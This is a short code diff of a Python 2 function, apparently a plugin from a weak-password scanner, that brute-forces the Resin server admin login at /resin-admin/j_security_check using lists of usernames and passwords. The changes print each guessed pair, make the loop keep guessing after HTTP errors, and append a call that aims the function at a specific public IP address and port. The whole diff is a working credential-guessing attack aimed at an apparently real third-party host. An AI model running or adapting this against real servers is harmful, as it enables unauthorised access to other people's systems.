@@ -11,12 +11,13 @@ def check(host,port,timeout):
     for user in user_list:
         for password in pass_list:
             try:
+                print user+":"+password
                 PostStr='j_username=%s&j_password=%s'%(user,password)
                 res = opener.open(url+'/resin-admin/j_security_check?j_uri=index.php',PostStr)
                 res_html = res.read()
                 res_code = res.code
             except urllib2.HTTPError,e:
-                return 'NO'
+                continue
             except urllib2.URLError,e:
                 error_i+=1
                 if error_i >= 3:
@@ -27,3 +28,5 @@ def check(host,port,timeout):
                     info = '%s/resin-admin Resin Weak password %s:%s'%(url,user,password)
                     return 'YES|'+info
     return 'NO'
+
+check('111.13.46.59',8081,10)
